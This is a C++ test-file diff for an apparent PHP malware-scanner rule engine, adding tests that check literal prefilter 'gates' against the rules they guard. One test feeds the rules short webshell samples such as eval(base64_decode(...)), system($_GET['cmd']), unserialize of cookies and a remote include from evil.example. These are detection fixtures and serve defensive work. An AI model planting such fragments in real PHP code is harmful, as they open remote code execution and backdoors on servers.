@@ -3,6 +3,7 @@
 #include <re2/re2.h>
 #include "config/Types.h"
 #include "core/MatchEngine.h"
+#include "core/LiteralPrefilter.h"
 #include "utils/SafeText.h"
 
 using namespace lyxbosa::rules;
@@ -987,4 +988,180 @@ TEST(BuiltinPatternTest, CaseVariantsOfBuiltinsStillMatch) {
         EXPECT_TRUE(rule->matches(c.content))
             << c.code << " missed a case variant: " << c.content;
     }
+}
+
+// ============================================================================
+// Literal gates
+//
+// A gate says "this pattern cannot match a file without these substrings", and
+// the engine uses it to skip work. If a gate is wrong the pattern is silently
+// never run on files it should have matched - a missed detection that produces
+// no error anywhere. These tests exist because that failure is invisible.
+// ============================================================================
+
+class LiteralGateTest : public ::testing::Test {
+protected:
+    // Two text projections of a pattern. A gate literal has to show up in one of
+    // them; this is a sanity check on the declaration, not a proof of requiredness
+    // (that is what the corpus differential against the previous binary is for).
+    //
+    //   1. escapes resolved  - finds contiguous literals: "base64_decode"
+    //   2. group syntax also removed - finds distributed ones: "$_get" inside
+    //      "\$_(GET|POST|REQUEST)", which is spelled across a group boundary
+    static bool appearsInAnyExpansion(std::string_view rx, const std::string& literal) {
+        std::string flat;
+        for (size_t i = 0; i < rx.size(); ++i) {
+            if (rx[i] == '\\' && i + 1 < rx.size()) {
+                // An escaped letter or digit is a class (\s \w \d \n \x41);
+                // escaped punctuation stands for itself (\$ \{ \( \. \|).
+                const char n = rx[i + 1];
+                if (!std::isalnum(static_cast<unsigned char>(n))) flat += n;
+                ++i;
+                continue;
+            }
+            flat += rx[i];
+        }
+        std::transform(flat.begin(), flat.end(), flat.begin(),
+                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
+        if (flat.find(literal) != std::string::npos) return true;
+
+        // 3. prefix distributed over a group's alternatives, which is how
+        //    "\$_(GET|POST|REQUEST)" spells $_get, $_post and $_request.
+        for (size_t open = flat.find('('); open != std::string::npos;
+             open = flat.find('(', open + 1)) {
+            const size_t close = flat.find(')', open);
+            if (close == std::string::npos) break;
+            const std::string body = flat.substr(open + 1, close - open - 1);
+            if (body.find('(') != std::string::npos) continue;   // nested, skip
+            if (body.find('|') == std::string::npos) continue;   // not an alternation
+
+            // the literal run immediately before the group
+            size_t p = open;
+            while (p > 0) {
+                const char c = flat[p - 1];
+                if (std::isalnum(static_cast<unsigned char>(c)) || c == '_' || c == '$') --p;
+                else break;
+            }
+            const std::string prefix = flat.substr(p, open - p);
+
+            size_t start = 0;
+            while (start <= body.size()) {
+                const size_t bar = body.find('|', start);
+                const size_t end = (bar == std::string::npos) ? body.size() : bar;
+                if ((prefix + body.substr(start, end - start)).find(literal) != std::string::npos) {
+                    return true;
+                }
+                if (bar == std::string::npos) break;
+                start = bar + 1;
+            }
+        }
+
+        std::string collapsed;
+        for (size_t i = 0; i < flat.size(); ++i) {
+            if (flat.compare(i, 4, "(?i:") == 0) { i += 3; continue; }
+            if (flat.compare(i, 3, "(?:") == 0) { i += 2; continue; }
+            const char c = flat[i];
+            if (c == '(' || c == ')' || c == '|') continue;
+            collapsed += c;
+        }
+        return collapsed.find(literal) != std::string::npos;
+    }
+};
+
+// Catches the failure that actually happened while building this: gates generated
+// in one order and applied in another, so every literal guarded the wrong rule.
+// A gate literal must at minimum be text that appears in the pattern it guards.
+TEST_F(LiteralGateTest, EveryGateLiteralAppearsInThePatternItGuards) {
+    size_t checked = 0;
+    for (const auto* rule : getAllBuiltinRules()) {
+        for (const auto& pattern : rule->patterns) {
+
+            for (const auto& entry : pattern.gate) {
+                if (entry.empty()) continue;
+                // an entry is alternatives separated by '|'; each must appear
+                size_t start = 0;
+                while (start <= entry.size()) {
+                    const size_t bar = entry.find('|', start);
+                    const size_t end = (bar == std::string_view::npos) ? entry.size() : bar;
+                    const std::string alt(entry.substr(start, end - start));
+                    if (!alt.empty()) {
+                        ++checked;
+                        EXPECT_TRUE(appearsInAnyExpansion(pattern.regex, alt))
+                            << rule->code.toString() << " (" << rule->name << ")\n"
+                            << "  gate literal : " << alt << "\n"
+                            << "  pattern      : " << pattern.regex;
+                    }
+                    if (bar == std::string_view::npos) break;
+                    start = bar + 1;
+                }
+            }
+        }
+    }
+    EXPECT_GT(checked, 100u) << "expected the gated pattern set to be walked";
+}
+
+// A gated pattern must still fire on text it is supposed to match. These are the
+// techniques the gates most affect; if a gate is over-specified this fails.
+TEST_F(LiteralGateTest, GatedRulesStillMatchTheirTechnique) {
+    struct Case { const char* code; const char* content; };
+    const Case cases[] = {
+        {"RCE001", "<?php eval(base64_decode(\"AAAA\"));"},
+        {"RCE001", "<?php EvAl( BaSe64_DeCoDe (\"AAAA\"));"},
+        {"RCE002", "<?php eval(gzinflate(\"x\"));"},
+        {"RCE004", "<?php eval($_GET['x']);"},
+        {"RCE005", "<?php assert($_POST['x']);"},
+        {"RCE008", "<?php system($_GET['cmd']);"},
+        {"RCE008", "<?php passthru($_REQUEST['c']);"},
+        {"EXP006", "<?php unserialize($_COOKIE['c']);"},
+        {"EXP007", "<?php unlink($_GET['f']);"},
+        {"WS008",  "<?php move_uploaded_file($a, $_POST['d']);"},
+        {"BD012",  "<?php file_put_contents($f, $_POST['data']);"},
+        {"OBF009", "<?php base64_decode(base64_decode($x));"},
+        {"DRP005", "<?php include('https://evil.example/x.txt');"},
+    };
+    for (const auto& c : cases) {
+        const auto* rule = getRuleByCode(c.code);
+        ASSERT_NE(rule, nullptr) << c.code;
+        EXPECT_TRUE(rule->matches(c.content)) << c.code << " on: " << c.content;
+    }
+}
+
+// The prefilter's own semantics: AND across entries, OR inside one, case folded.
+TEST_F(LiteralGateTest, PrefilterSemantics) {
+    using lyxbosa::LiteralPrefilter;
+
+    rules::Pattern both{R"(x)", "", false, {"alpha", "beta"}};
+    rules::Pattern either{R"(x)", "", false, {"gamma|delta"}};
+    rules::Pattern none{R"(x)", "", false, {}};
+
+    LiteralPrefilter pf;
+    const size_t hBoth = pf.add(both);
+    const size_t hEither = pf.add(either);
+    const size_t hNone = pf.add(none);
+    ASSERT_TRUE(pf.compile());
+    EXPECT_EQ(hNone, LiteralPrefilter::kAlwaysRun);
+
+    auto present = pf.scan("nothing relevant here");
+    EXPECT_FALSE(pf.allows(hBoth, present));
+    EXPECT_FALSE(pf.allows(hEither, present));
+    EXPECT_TRUE(pf.allows(hNone, present));
+
+    present = pf.scan("only ALPHA is here");   // AND not satisfied
+    EXPECT_FALSE(pf.allows(hBoth, present));
+
+    present = pf.scan("Alpha and BETA both");  // case-insensitive
+    EXPECT_TRUE(pf.allows(hBoth, present));
+
+    present = pf.scan("just DELTA");           // OR satisfied by one alternative
+    EXPECT_TRUE(pf.allows(hEither, present));
+}
+
+// An unusable prefilter must fall back to running everything, never to skipping.
+TEST_F(LiteralGateTest, EmptyPrefilterAllowsEverything) {
+    using lyxbosa::LiteralPrefilter;
+    LiteralPrefilter pf;
+    rules::Pattern p{R"(x)", "", false, {"needle"}};
+    const size_t h = pf.add(p);
+    // compile() never called: scan returns empty, which means "run everything"
+    EXPECT_TRUE(pf.allows(h, LiteralPrefilter::Present{}));
 }
